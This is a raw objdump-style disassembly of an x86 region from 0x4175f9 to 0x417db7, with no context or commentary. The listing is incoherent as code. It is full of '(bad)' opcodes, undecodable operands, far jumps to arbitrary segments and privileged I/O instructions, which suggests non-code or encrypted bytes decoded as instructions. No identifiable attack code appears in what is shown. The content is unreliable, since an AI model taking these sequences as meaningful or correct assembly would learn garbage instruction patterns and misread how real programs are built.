  4175f9:	push   esi
  4175fa:	lea    esi,[edi+ecx*8+0x6c8b4782]
  417601:	pop    ss
  417602:	pop    ss
  417603:	or     al,0x84
  417605:	daa    
  417606:	adc    esi,edx
  417608:	cmc    
  417609:	fisttp WORD PTR [edi-0x39c150ef]
  41760f:	jl     0x41767e
  417611:	jecxz  0x417640
  417613:	ins    DWORD PTR es:[edi],dx
  417614:	icebp  
  417615:	dec    ebp
  417616:	mov    ecx,0xe419d2ef
  41761b:	mov    ds:0xe4454cc,eax
  417620:	jecxz  0x41765c
  417622:	and    ah,BYTE PTR [edi]
  417624:	sbb    ch,BYTE PTR [edi-0x4689c644]
  41762a:	mov    ds:0xdd2b0f66,eax
  41762f:	ret    0xd41c
  417632:	stos   BYTE PTR es:[edi],al
  417633:	xchg   DWORD PTR [ecx],ecx
  417635:	inc    eax
  417636:	scas   eax,DWORD PTR es:[edi]
  417637:	mov    cl,0x64
  417639:	sub    DWORD PTR ds:0x8250e1fd,esp
  41763f:	xor    bl,BYTE PTR [edi-0x37c6adc4]
  417645:	mov    ebp,0xc83f5730
  41764a:	repnz jmp FWORD PTR [eax-0x57609022]
  417651:	mov    cs:0x896c1562,eax
  417657:	ret    0xb940
  41765a:	xchg   ebp,eax
  41765b:	push   ds
  41765c:	imul   ebx,DWORD PTR [edx+0x78],0x1ee7bda3
  417663:	lea    ecx,[eax-0x61838013]
  417669:	imul   eax,DWORD PTR [edi],0xfb74f1f7
  41766f:	xchg   ebp,eax
  417670:	dec    BYTE PTR [esi]
  417672:	lock sub eax,0x84f7c6cf
  417678:	mov    bh,0x9c
  41767a:	outs   dx,BYTE PTR ds:[esi]
  41767b:	daa    
  41767c:	iret   
  41767d:	or     DWORD PTR [edi],0xffffff87
  417680:	mov    al,0x24
  417682:	lods   eax,DWORD PTR ds:[esi]
  417683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417684:	es xor ecx,esi
  417687:	xchg   esp,eax
  417688:	adc    dh,bl
  41768a:	jns    0x45963e8e
  417690:	pop    edx
  417691:	and    edi,DWORD PTR [eax]
  417693:	push   cs
  417694:	leave  
  417695:	stc    
  417696:	(bad)  
  417697:	lock mov esp,0xc2676ed7
  41769d:	aas    
  41769e:	aam    0xa8
  4176a0:	outs   dx,DWORD PTR ds:[esi]
  4176a1:	push   ecx
  4176a2:	jg     0x41769b
  4176a4:	fucomi st,st(1)
  4176a6:	adc    eax,0xa4d8e9f2
  4176ab:	jmp    0x4176aa
  4176ad:	dec    ebx
  4176ae:	retf   0x8e8e
  4176b1:	dec    esp
  4176b2:	ins    BYTE PTR es:[edi],dx
  4176b3:	dec    ecx
  4176b4:	jmp    0x417726
  4176b6:	xchg   esi,eax
  4176b7:	cdq    
  4176b8:	loop   0x4176cf
  4176ba:	mov    eax,ds:0x44fbfcba
  4176bf:	in     al,0xb7
  4176c1:	jle    0x417725
  4176c3:	jl     0x417663
  4176c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176c6:	aam    0x11
  4176c8:	and    BYTE PTR [esi],0xb6
  4176cb:	jnp    0x41764e
  4176cd:	das    
  4176ce:	popa   
  4176cf:	in     eax,0x29
  4176d1:	and    cl,cl
  4176d3:	add    DWORD PTR [esi-0x57b49c11],edi
  4176d9:	stos   BYTE PTR es:[edi],al
  4176da:	addr16 jb 0x4176b3
  4176dd:	mov    eax,ds:0x55e5cf93
  4176e2:	mov    gs,WORD PTR [esi-0x68fac075]
  4176e8:	xchg   ebx,eax
  4176e9:	pushf  
  4176ea:	push   cs
  4176eb:	out    dx,al
  4176ec:	ret    
  4176ed:	call   0x829208e7
  4176f2:	(bad)  [ebp-0x39]
  4176f5:	mov    al,ds:0x27e3c173
  4176fa:	xor    dl,bl
  4176fc:	dec    esi
  4176fd:	je     0x417772
  4176ff:	xlat   BYTE PTR ds:[ebx]
  417700:	call   0x964:0xea46d333
  417707:	mov    ds:0xc398e979,al
  41770c:	mov    ?,WORD PTR [esi]
  41770e:	mov    ebp,?
  417710:	jmp    0x417727
  417712:	fstp   QWORD PTR [ebp+ebp*1-0x3f7b5d45]
  417719:	xchg   DWORD PTR [edx+0x51],esi
  41771c:	mov    ah,0x54
  41771e:	outs   dx,BYTE PTR ds:[esi]
  41771f:	test   BYTE PTR ds:0x553d63d1,ch
  417725:	inc    edi
  417726:	adc    cl,BYTE PTR [edx+0x48ff34d4]
  41772c:	add    dl,cl
  41772e:	jge    0x41771c
  417730:	scas   eax,DWORD PTR es:[edi]
  417731:	inc    ecx
  417732:	jmp    0xdc33:0xddf95a40
  417739:	mov    bl,0x9c
  41773b:	sub    eax,0x9a5523a2
  417740:	stos   DWORD PTR es:[edi],eax
  417741:	cmc    
  417742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417743:	sti    
  417744:	(bad)  
  417746:	das    
  417747:	push   cs
  417748:	ins    DWORD PTR es:[edi],dx
  417749:	(bad)  
  41774a:	call   0xa0eb25bf
  41774f:	dec    ecx
  417750:	mov    fs,WORD PTR [edx]
  417752:	retf   0x7d7b
  417755:	lea    eax,[ebp+0x54]
  417758:	mov    eax,ds:0x2b09ac25
  41775d:	xchg   esp,eax
  41775e:	inc    esi
  41775f:	add    eax,0x69e28ba5
  417764:	jne    0x41778b
  417766:	push   ds
  417767:	xchg   esi,eax
  417768:	test   DWORD PTR [edx-0x38f72b13],ecx
  41776e:	(bad)  
  41776f:	out    0x0,al
  417771:	dec    ebx
  417772:	add    al,0x71
  417774:	and    ecx,esi
  417776:	inc    ebx
  417777:	repnz nop
  417779:	cwde   
  41777a:	adc    BYTE PTR [esi+0x34],ah
  41777d:	xchg   ebp,eax
  41777e:	dec    esp
  41777f:	inc    edx
  417780:	stos   BYTE PTR es:[edi],al
  417781:	sub    al,0xc3
  417783:	test   bh,bh
  417785:	push   esi
  417786:	test   eax,0xa1d23f01
  41778b:	sub    bh,bh
  41778d:	add    eax,0x7c0d394
  417792:	repz xchg ebp,eax
  417794:	pusha  
  417795:	mov    cl,0x8
  417797:	cmp    ch,BYTE PTR [eax+eax*2+0x31]
  41779b:	test   BYTE PTR [esi],0xd9
  41779e:	sahf   
  41779f:	mov    esp,DWORD PTR [esi+0x652dab5c]
  4177a5:	je     0x41778d
  4177a7:	sub    dh,BYTE PTR [ecx+0x201033ab]
  4177ad:	add    BYTE PTR [esi+0x23],dl
  4177b0:	les    ecx,FWORD PTR [esi+0x52]
  4177b3:	cmp    eax,0x1cdbf1e2
  4177b8:	push   ss
  4177b9:	jae    0x417766
  4177bb:	int3   
  4177bc:	xchg   DWORD PTR [ecx+edx*1+0x14be1da2],esp
  4177c3:	xchg   si,ax
  4177c5:	adc    dh,BYTE PTR [edx+0x3c]
  4177c8:	(bad)  
  4177c9:	icebp  
  4177ca:	pushf  
  4177cb:	out    dx,al
  4177cc:	(bad)  
  4177cd:	(bad)  
  4177ce:	pop    ebx
  4177cf:	inc    edx
  4177d0:	inc    ebp
  4177d1:	out    0x8f,al
  4177d3:	xlat   BYTE PTR ds:[ebx]
  4177d4:	aam    0x3d
  4177d6:	and    ebp,DWORD PTR [edx+edx*4+0x6ea355f4]
  4177dd:	fs adc al,0x6e
  4177e0:	lea    ebx,[ebx-0x4f]
  4177e3:	inc    edx
  4177e4:	mov    ecx,DWORD PTR [eax]
  4177e6:	ds in  al,0x30
  4177e9:	cdq    
  4177ea:	fsub   DWORD PTR [ebp-0x70]
  4177ed:	repnz adc eax,ebx
  4177f0:	fwait
  4177f1:	sub    al,0x4b
  4177f3:	popa   
  4177f4:	add    eax,0x959f621b
  4177f9:	les    edi,FWORD PTR [esi-0x3a2380e0]
  4177ff:	nop
  417800:	in     al,dx
  417801:	push   edi
  417802:	xchg   cl,ch
  417804:	add    BYTE PTR [esi-0x56a08c68],0x57
  41780b:	lea    esi,[esi+ebx*2-0x33]
  41780f:	pop    esp
  417810:	jp     0x41779c
  417812:	sub    esp,eax
  417814:	sbb    BYTE PTR [edx+0x6f],bh
  417817:	xor    al,BYTE PTR [edi]
  417819:	add    eax,0x3dfcf10b
  41781e:	adc    dl,dl
  417820:	xchg   ecx,eax
  417821:	mov    al,0x3a
  417823:	hlt    
  417824:	mov    ecx,0x90c8b08a
  417829:	pop    es
  41782a:	push   esi
  41782b:	push   0x35
  41782d:	add    al,BYTE PTR [ecx-0x48105b28]
  417833:	lods   eax,DWORD PTR ds:[esi]
  417834:	mov    eax,es
  417836:	lea    ebx,[eax+0x6f]
  417839:	jg     0x4178b8
  41783b:	std    
  41783c:	int3   
  41783d:	sub    DWORD PTR [edx+eax*8+0x16905e16],ebx
  417844:	add    DWORD PTR [ebx+0x4ffa682],eax
  41784a:	outs   dx,BYTE PTR ds:[esi]
  41784b:	pop    eax
  41784c:	das    
  41784d:	or     ah,BYTE PTR [ecx+0x559fb35c]
  417853:	out    dx,al
  417854:	test   DWORD PTR [eax+esi*1-0x20],esi
  417858:	mov    eax,ds:0x9ce42b0e
  41785d:	sbb    DWORD PTR [eax+0x3],ebp
  417860:	iret   
  417861:	mov    eax,0xb81c8ba6
  417866:	jae    0x4177f7
  417868:	push   ds
  417869:	sub    edx,DWORD PTR [edx]
  41786b:	cmc    
  41786c:	lods   al,BYTE PTR ds:[esi]
  41786d:	sbb    BYTE PTR [edi-0x2527ed7],0x6b
  417874:	sub    ch,bl
  417876:	iret   
  417877:	or     BYTE PTR [ebx-0x62],0x94
  41787b:	inc    esp
  41787c:	lods   al,BYTE PTR ds:[esi]
  41787d:	test   eax,0x29a4e889
  417882:	mov    cl,0x2
  417884:	(bad)  
  417885:	gs jbe 0x417835
  417888:	sar    ah,1
  41788a:	and    eax,0x602b80fd
  41788f:	and    BYTE PTR [esi],ch
  417891:	and    DWORD PTR [ecx+0x3e],eax
  417894:	(bad)  
  417895:	ins    DWORD PTR es:[edi],dx
  417896:	dec    edi
  417897:	xor    al,0x13
  417899:	jmp    0x44037f74
  41789e:	call   DWORD PTR [eax+0x7f]
  4178a1:	xchg   ebx,eax
  4178a2:	inc    ebx
  4178a3:	cmp    DWORD PTR [edi+0xabf7b4a],edi
  4178a9:	push   edi
  4178aa:	xchg   ebp,eax
  4178ab:	sub    BYTE PTR [ecx],bh
  4178ad:	enter  0x14a1,0x42
  4178b1:	sub    al,0xa0
  4178b3:	std    
  4178b4:	std    
  4178b5:	cmp    eax,edx
  4178b7:	(bad)  
  4178b8:	cmc    
  4178b9:	pop    eax
  4178ba:	data16 (bad) 
  4178bd:	jns    0x417931
  4178bf:	and    al,0xfd
  4178c1:	bound  esp,QWORD PTR [eax-0x3bb34a2c]
  4178c7:	and    BYTE PTR [edi],dh
  4178c9:	scas   al,BYTE PTR es:[edi]
  4178ca:	mov    bl,0x5a
  4178cc:	out    0xe7,eax
  4178ce:	cdq    
  4178cf:	add    BYTE PTR [ebp-0x38],ah
  4178d2:	cmp    esp,DWORD PTR [ebx-0x4c]
  4178d5:	ret    
  4178d6:	in     al,dx
  4178d7:	xchg   esp,eax
  4178d8:	xchg   edi,eax
  4178d9:	cmp    BYTE PTR [ebp+0x243ecc32],ah
  4178df:	pop    eax
  4178e0:	inc    eax
  4178e1:	stc    
  4178e2:	fmul   DWORD PTR [edi-0x1c7f36ff]
  4178e8:	cmp    DWORD PTR [ebx-0x6ad340a4],eax
  4178ee:	cmp    BYTE PTR [eax-0x74db5e4],bl
  4178f4:	in     eax,0xd2
  4178f6:	pop    edi
  4178f7:	cs cs xchg ebp,eax
  4178fa:	dec    eax
  4178fb:	fdiv   QWORD PTR [edx]
  4178fd:	mov    ebp,0x5c7bc970
  417902:	adc    eax,0x58ffdb0d
  417907:	pop    esi
  417908:	retf   0xc4b8
  41790b:	iret   
  41790c:	pop    es
  41790d:	or     ebp,DWORD PTR [ecx-0x50]
  417910:	push   ds
  417911:	ds push ebp
  417913:	xor    al,0xbf
  417915:	push   eax
  417916:	mov    WORD PTR [ebx],?
  417918:	mov    eax,ds:0x1266561f
  41791d:	fcomp  DWORD PTR [ecx-0x4955ba91]
  417923:	lea    edx,[esi-0x6e3cb59c]
  417929:	push   ecx
  41792a:	cmc    
  41792b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41792c:	ficomp WORD PTR [ecx+edx*1-0x4e54827]
  417933:	jnp    0x417991
  417935:	xchg   edx,eax
  417936:	leave  
  417937:	call   0x2396136e
  41793c:	pop    ds
  41793d:	sahf   
  41793e:	pusha  
  41793f:	sub    BYTE PTR [edx],dh
  417941:	outs   dx,BYTE PTR ds:[esi]
  417942:	xor    WORD PTR [ecx],ax
  417945:	aam    0x98
  417947:	dec    ebp
  417948:	vsubpd xmm1,xmm4,XMMWORD PTR [ebx-0x136cbbf1]
  417950:	jl     0x41791e
  417952:	jno    0x417922
  417954:	cmp    ebp,0xd9bfe24e
  41795a:	imul   edi,DWORD PTR [ecx+0x334b4613],0xfb9f4746
  417964:	dec    ecx
  417965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417966:	scas   eax,DWORD PTR es:[edi]
  417967:	xor    eax,0xf584550c
  41796c:	dec    esi
  41796d:	aam    0xd8
  41796f:	dec    ebp
  417970:	inc    ebp
  417971:	mov    ch,0x1
  417973:	retf   
  417974:	sub    eax,DWORD PTR [esi+ebx*2]
  417977:	dec    eax
  417978:	ret    
  417979:	dec    esp
  41797a:	mov    eax,0xc88f1a53
  41797f:	cmp    al,0x55
  417981:	outs   dx,BYTE PTR ds:[esi]
  417982:	ror    dl,cl
  417984:	and    DWORD PTR [eax+0x276dc135],eax
  41798a:	or     al,BYTE PTR [ebp-0x5feed495]
  417990:	inc    ecx
  417991:	fwait
  417992:	iret   
  417993:	jmp    0x778f:0x415359a5
  41799a:	fist   WORD PTR [edi+0x75f098f9]
  4179a0:	cmp    bh,ch
  4179a2:	in     eax,dx
  4179a3:	cs mov ebx,0x26e663e2
  4179a9:	pop    esp
  4179aa:	sbb    eax,0xe46e8029
  4179af:	cli    
  4179b0:	push   es
  4179b1:	jmp    0x1f8c:0xdb103f24
  4179b8:	mov    al,ds:0xa02dde27
  4179bd:	popa   
  4179be:	push   cs
  4179bf:	retf   0x80b2
  4179c2:	ret    
  4179c3:	rol    BYTE PTR [edx+eax*1+0x64a88965],cl
  4179ca:	mov    esi,eax
  4179cc:	adc    BYTE PTR [ecx-0x47097af0],cl
  4179d2:	sub    dl,dh
  4179d4:	or     eax,0x2c573bec
  4179d9:	push   ebp
  4179da:	jo     0x4179c7
  4179dc:	cmp    eax,0x793f519e
  4179e1:	(bad)  
  4179e2:	dec    ebx
  4179e3:	xlat   BYTE PTR ds:[ebx]
  4179e4:	mov    ebp,ebp
  4179e6:	mov    BYTE PTR [ebp+0x73],dh
  4179e9:	clc    
  4179ea:	cmp    ecx,DWORD PTR [edi+0x7f43d16d]
  4179f0:	pushf  
  4179f1:	repnz push ebp
  4179f3:	ret    0xecbe
  4179f6:	int    0x3b
  4179f8:	bound  esi,QWORD PTR [ecx-0x2b9decdc]
  4179fe:	pusha  
  4179ff:	les    esp,FWORD PTR [ebx+0x476c407b]
  417a05:	inc    esi
  417a06:	mov    edi,0x8d47dcd1
  417a0b:	and    ah,BYTE PTR [eax+eax*8+0x5408ef13]
  417a12:	test   al,0xae
  417a14:	mov    edx,DWORD PTR [ecx+0x33c0bbc1]
  417a1a:	mov    bh,0x8a
  417a1c:	adc    ebx,eax
  417a1e:	add    ah,dl
  417a20:	jne    0x417a3d
  417a22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a23:	repz mov ss,WORD PTR [ebx-0x6b06293c]
  417a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a2b:	add    BYTE PTR [esi+0x5c],bl
  417a2e:	sbb    eax,0x36626fbe
  417a33:	jno    0x4179e0
  417a35:	dec    edi
  417a36:	loopne 0x4179e7
  417a38:	(bad)
  417a3d:	jno    0x417a3d
  417a3f:	je     0x417ab3
  417a41:	sub    DWORD PTR [ebx+0x5d],0xae11108d
  417a48:	aas    
  417a49:	arpl   bx,sp
  417a4b:	xchg   edx,eax
  417a4c:	mov    edi,DWORD PTR [edi+0x9316f88]
  417a52:	in     al,dx
  417a53:	neg    BYTE PTR [ecx+esi*2+0x7156348b]
  417a5a:	dec    esp
  417a5b:	xchg   esp,ecx
  417a5d:	popf   
  417a5e:	sub    BYTE PTR [edi+esi*1+0xa],ah
  417a62:	cmc    
  417a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a64:	or     al,0x92
  417a66:	scas   al,BYTE PTR es:[edi]
  417a67:	sar    DWORD PTR [ecx-0x37],cl
  417a6a:	cwde   
  417a6b:	inc    ebp
  417a6c:	sbb    ch,BYTE PTR [edi-0x7d198a33]
  417a72:	mov    bl,ch
  417a74:	icebp  
  417a75:	or     edx,eax
  417a77:	xlat   BYTE PTR ds:[ebx]
  417a78:	lods   al,BYTE PTR ds:[esi]
  417a79:	sti    
  417a7a:	pop    ebp
  417a7b:	ret    
  417a7c:	js     0x417ad9
  417a7e:	fld    TBYTE PTR [ebx+0x10c6d62a]
  417a84:	jae    0x417af2
  417a86:	pop    edi
  417a87:	lea    esi,[esi-0x70]
  417a8a:	fstp   DWORD PTR [ebx-0x171cc91]
  417a90:	stc    
  417a91:	jmp    0x417a43
  417a93:	cmc    
  417a94:	xchg   ebx,eax
  417a95:	les    edi,FWORD PTR [eax+0x3ca19d65]
  417a9b:	xlat   BYTE PTR ds:[ebx]
  417a9c:	mov    dh,0xcb
  417a9e:	jge    0x417a22
  417aa0:	adc    edi,DWORD PTR [edx+0x50]
  417aa3:	dec    ecx
  417aa4:	mov    ds:0x77c07a05,al
  417aa9:	mov    eax,ds:0xd4259cd
  417aae:	mov    ds:0x8e5e7949,eax
  417ab3:	and    cl,BYTE PTR [edi+edi*4]
  417ab6:	xchg   esp,eax
  417ab7:	sahf   
  417ab8:	mov    ?,WORD PTR [edx]
  417aba:	jno    0x417a61
  417abc:	(bad)  
  417abe:	or     eax,0x6ce370e2
  417ac3:	add    al,0xa1
  417ac5:	push   ebx
  417ac6:	call   DWORD PTR ds:0x9c0be598
  417acc:	sub    DWORD PTR [esi],edx
  417ace:	pop    edx
  417acf:	js     0x417a98
  417ad1:	add    edi,ecx
  417ad3:	mov    ecx,0xc61f08d9
  417ad8:	ins    DWORD PTR es:[edi],dx
  417ad9:	or     DWORD PTR [ebx+0x32],edi
  417adc:	aam    0xd5
  417ade:	mov    edi,esi
  417ae0:	jnp    0x417a88
  417ae2:	mul    DWORD PTR [edx-0x52]
  417ae5:	scas   al,BYTE PTR es:[edi]
  417ae6:	(bad)  
  417ae7:	js     0x417a6a
  417ae9:	in     eax,dx
  417aea:	mov    bh,0x7c
  417aec:	lods   eax,DWORD PTR ds:[esi]
  417aed:	repnz xor al,0x83
  417af0:	std    
  417af1:	xor    DWORD PTR [ebp-0x25],ecx
  417af4:	out    0xf9,eax
  417af6:	aam    0x67
  417af8:	imul   esi,DWORD PTR [eax-0xc],0x7d
  417afc:	cdq    
  417afd:	jmp    0x6a3f:0xed9ab2f3
  417b04:	or     eax,0x43bfe4c4
  417b09:	sahf   
  417b0a:	mov    al,ds:0xcbf7dbef
  417b0f:	sub    ah,BYTE PTR [edi]
  417b11:	xor    eax,0xfa523a49
  417b16:	or     DWORD PTR [ecx-0x10],0x5a
  417b1a:	dec    esi
  417b1b:	pop    edx
  417b1c:	js     0x417af7
  417b1e:	fidiv  WORD PTR [ebx]
  417b20:	sbb    BYTE PTR [ebp-0x7842bff8],dh
  417b26:	xor    ch,dh
  417b28:	retf   
  417b29:	scas   al,BYTE PTR es:[edi]
  417b2a:	jle    0x417afe
  417b2c:	mov    esp,0xc690caae
  417b31:	pop    edi
  417b32:	sub    eax,0x75ba517
  417b37:	jbe    0x417b64
  417b39:	jmp    0x417b24
  417b3b:	repz add DWORD PTR [edi+0x5a2dc6e7],ecx
  417b42:	inc    ebx
  417b43:	inc    ebx
  417b44:	aam    0x57
  417b46:	mov    WORD PTR [ecx],?
  417b48:	lahf   
  417b49:	mov    edx,0xdb95c3a1
  417b4e:	xor    bl,al
  417b50:	mov    ecx,DWORD PTR [eax-0x78]
  417b53:	pop    ebx
  417b54:	mov    ss,edx
  417b56:	mov    al,ds:0xbcfa1835
  417b5b:	mov    ds:0xa95279e0,eax
  417b60:	call   0x8d76:0x2254bf8d
  417b67:	(bad)  
  417b68:	mov    eax,ds:0xd862a29f
  417b6d:	fwait
  417b6e:	or     ecx,esp
  417b70:	sahf   
  417b71:	sbb    eax,0xec363ea7
  417b76:	push   ebp
  417b77:	push   0xffffffae
  417b79:	xor    eax,ecx
  417b7b:	push   ss
  417b7c:	ins    DWORD PTR es:[edi],dx
  417b7d:	ins    BYTE PTR es:[edi],dx
  417b7e:	cwde   
  417b7f:	(bad)  
  417b80:	in     al,dx
  417b81:	jne    0x417bcc
  417b83:	and    esp,eax
  417b85:	jl     0x417b7f
  417b87:	mov    bl,0x78
  417b89:	out    0x2f,eax
  417b8b:	add    dh,BYTE PTR [edi+0x70be8868]
  417b91:	popf   
  417b92:	sbb    eax,0xe7c71eb2
  417b97:	jne    0x417bdd
  417b99:	ins    BYTE PTR es:[edi],dx
  417b9a:	push   edx
  417b9b:	pop    edx
  417b9c:	and    BYTE PTR [edx+0x30],ch
  417b9f:	out    0x41,al
  417ba1:	push   edi
  417ba2:	pop    edi
  417ba3:	mov    edx,DWORD PTR [eax]
  417ba5:	push   ds
  417ba6:	dec    ebx
  417ba7:	(bad)  
  417ba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ba9:	xchg   edi,eax
  417baa:	push   esp
  417bab:	xchg   esi,eax
  417bac:	ins    BYTE PTR es:[edi],dx
  417bad:	sbb    ebx,DWORD PTR [eax]
  417baf:	outs   dx,DWORD PTR ds:[esi]
  417bb0:	out    dx,eax
  417bb1:	mov    esp,0xd4627e1
  417bb6:	icebp  
  417bb7:	scas   eax,DWORD PTR es:[edi]
  417bb8:	xchg   BYTE PTR [ebp-0x11],ah
  417bbb:	jmp    0x417b6a
  417bbd:	push   es
  417bbe:	(bad)  
  417bbf:	cmp    al,0x30
  417bc1:	loope  0x417be8
  417bc3:	mov    dl,0x23
  417bc5:	ror    DWORD PTR [edx],cl
  417bc7:	sub    edx,DWORD PTR [esi]
  417bc9:	sahf   
  417bca:	hlt    
  417bcb:	pop    es
  417bcc:	xlat   BYTE PTR ds:[ebx]
  417bcd:	in     eax,0xde
  417bcf:	push   ebp
  417bd0:	daa    
  417bd1:	loopne 0x417b5c
  417bd3:	mov    esi,ebx
  417bd5:	and    esp,ebx
  417bd7:	push   edi
  417bd8:	dec    ebx
  417bd9:	jl     0x417b78
  417bdb:	(bad)  
  417bdc:	out    0xbc,eax
  417bde:	jnp    0x417be0
  417be0:	test   BYTE PTR [esi-0x75],dh
  417be3:	mov    edi,DWORD PTR [ebp*1+0x37d40edb]
  417bea:	(bad)  
  417bec:	(bad)  
  417bed:	add    BYTE PTR [ecx+0x54],bl
  417bf0:	pop    edx
  417bf1:	aad    0x5f
  417bf3:	mov    ch,0xec
  417bf5:	push   ss
  417bf6:	bound  ecx,QWORD PTR ds:0x5e1f944c
  417bfc:	ja     0x417b7f
  417bfe:	jg     0x417bb3
  417c00:	jp     0x417c47
  417c02:	rcr    eax,cl
  417c04:	mov    DWORD PTR [edi+0x678ec60],esp
  417c0a:	push   0xffffffbf
  417c0c:	mov    bh,0x64
  417c0e:	jno    0x417c8f
  417c10:	mov    BYTE PTR [ebx-0x205bc5db],cl
  417c16:	popf   
  417c17:	or     bh,BYTE PTR [di]
  417c1a:	ror    bh,0x41
  417c1d:	dec    BYTE PTR [esi]
  417c1f:	push   0x50940114
  417c24:	mov    bh,0x7
  417c26:	(bad)  
  417c27:	shl    cl,0x92
  417c2a:	lea    ebp,[ecx]
  417c2c:	pop    ebp
  417c2d:	jmp    0x8f62:0xb77bcb6b
  417c34:	fld    st(5)
  417c36:	xchg   ecx,eax
  417c37:	cmp    BYTE PTR [ebx],0xa2
  417c3a:	sbb    BYTE PTR [eax+0x44743a7c],al
  417c40:	test   ah,ah
  417c42:	xor    eax,0x2ce0f93b
  417c47:	sub    eax,0x8b266326
  417c4c:	aam    0x64
  417c4e:	aad    0xc4
  417c50:	jb     0x417c46
  417c52:	imul   eax,DWORD PTR [ebp-0x68ed18f1],0xcea8ffbf
  417c5c:	repz (bad) 
  417c5e:	ror    BYTE PTR [ebp-0x62],1
  417c61:	lods   eax,DWORD PTR ds:[esi]
  417c62:	loop   0x417bed
  417c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c65:	mov    al,ds:0x641dffff
  417c6a:	div    DWORD PTR [ebx-0x48465140]
  417c70:	shr    DWORD PTR [edx+0x3702fa6c],0x10
  417c77:	sbb    eax,0xf74dba40
  417c7c:	aad    0x2e
  417c7e:	add    eax,DWORD PTR [eax+ecx*2]
  417c81:	dec    ebp
  417c82:	dec    ecx
  417c83:	mov    eax,ds:0x6b815d3d
  417c88:	cmp    eax,DWORD PTR [edx+0x2d]
  417c8b:	fnstsw WORD PTR [ebp-0x47]
  417c8e:	pop    ds
  417c8f:	pushf  
  417c90:	in     al,0x3d
  417c92:	sub    al,0x3d
  417c94:	fsub   DWORD PTR [ebx-0x69304bf]
  417c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c9b:	out    dx,eax
  417c9c:	lea    ecx,ss:[eax]
  417c9f:	fdivr  st(1),st
  417ca1:	das    
  417ca2:	push   ecx
  417ca3:	int3   
  417ca4:	push   ecx
  417ca5:	ja     0x417c6a
  417ca7:	fstp   TBYTE PTR [edx-0x21e8e439]
  417cad:	repz mov ecx,0x9f3d9cbb
  417cb3:	or     bh,BYTE PTR [eax+0x5589977a]
  417cb9:	add    DWORD PTR [ebx],ebp
  417cbb:	out    dx,al
  417cbc:	adc    DWORD PTR [ecx+0x36],0x49
  417cc0:	add    esp,ebp
  417cc2:	adc    al,0x1f
  417cc4:	fidiv  WORD PTR [edi]
  417cc6:	xor    bh,BYTE PTR [edi]
  417cc8:	fwait
  417cc9:	(bad)  
  417cca:	xchg   DWORD PTR [edx+0x1d0cc790],ebp
  417cd0:	iret   
  417cd1:	dec    edx
  417cd2:	add    eax,0xf4945f6f
  417cd7:	ret    
  417cd8:	in     eax,0x3c
  417cda:	dec    ebp
  417cdb:	es pop esp
  417cdd:	cli    
  417cde:	lahf   
  417cdf:	pop    eax
  417ce0:	sbb    al,0x4e
  417ce2:	aas    
  417ce3:	mov    al,0x50
  417ce5:	stos   BYTE PTR es:[edi],al
  417ce6:	and    BYTE PTR [ecx-0x3a],dh
  417ce9:	xchg   edx,eax
  417cea:	mov    bl,0xbb
  417cec:	sbb    ah,BYTE PTR [esi+0x18357dd6]
  417cf2:	sub    al,0xd3
  417cf4:	scas   al,BYTE PTR es:[edi]
  417cf5:	dec    BYTE PTR gs:0x98a431cd
  417cfc:	mov    ?,WORD PTR [ecx+0x19]
  417cff:	jp     0x417d6d
  417d01:	out    dx,eax
  417d02:	xor    eax,0xc5e8288
  417d07:	inc    eax
  417d08:	js     0x417c8f
  417d0a:	xchg   edx,eax
  417d0b:	div    esi
  417d0d:	fidiv  DWORD PTR [eax-0x6b30f910]
  417d13:	xchg   ebx,eax
  417d14:	fs dec ebx
  417d16:	pop    eax
  417d17:	lods   eax,DWORD PTR ds:[esi]
  417d18:	sub    bl,BYTE PTR [ecx+0x65467df7]
  417d1e:	mov    BYTE PTR [edx+eax*1-0x7f],ah
  417d22:	lods   eax,DWORD PTR ds:[esi]
  417d23:	jno    0x417d02
  417d25:	bound  edi,QWORD PTR [ecx]
  417d27:	lds    ebp,FWORD PTR [edi+eiz*1-0x2]
  417d2b:	mov    eax,ds:0x7b94eab0
  417d30:	or     eax,0x2b454456
  417d35:	ror    ecx,1
  417d37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d38:	shr    BYTE PTR [esi-0x34c54188],cl
  417d3e:	cld    
  417d3f:	ret    
  417d40:	test   eax,0x4500eac0
  417d45:	push   esp
  417d46:	test   edx,0x6126ccef
  417d4c:	(bad)  
  417d4e:	mov    ds:0xb5fb4b37,eax
  417d53:	cli    
  417d54:	lds    edi,FWORD PTR [ecx+0x749a1f54]
  417d5a:	mov    WORD PTR [esi-0x10a2e485],es
  417d60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d61:	int3   
  417d62:	(bad)  
  417d63:	lods   eax,DWORD PTR ds:[esi]
  417d64:	rol    ebx,0x1e
  417d67:	nop
  417d68:	jmp    0xf2be:0xe0b5fe4e
  417d6f:	or     ah,BYTE PTR [ebx]
  417d71:	jnp    0x417d88
  417d73:	fadd   DWORD PTR [edi+0x56]
  417d76:	or     BYTE PTR [esi-0x74],ah
  417d79:	mov    ebp,DWORD PTR [edi-0xc54c6ea]
  417d7f:	pop    ss
  417d80:	dec    edi
  417d81:	push   0xab695f68
  417d86:	mov    ss,WORD PTR [ecx+0x76f14a2]
  417d8c:	fidiv  DWORD PTR [esi-0x5a865c37]
  417d92:	ss mov dh,0xb6
  417d95:	push   edx
  417d96:	dec    edi
  417d97:	(bad)  
  417d98:	retf   0xbb55
  417d9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d9c:	shr    BYTE PTR [ebx+0xd],cl
  417d9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417da0:	jmp    0xc57a:0x3e085665
  417da7:	adc    ebp,edi
  417da9:	sbb    ch,BYTE PTR [edi+eax*2]
  417dac:	or     BYTE PTR es:0x690a611b,ah
  417db3:	imul   esi,DWORD PTR [ecx],0xfffffff6
  417db6:	int3   
  417db7:	and    ecx,esi
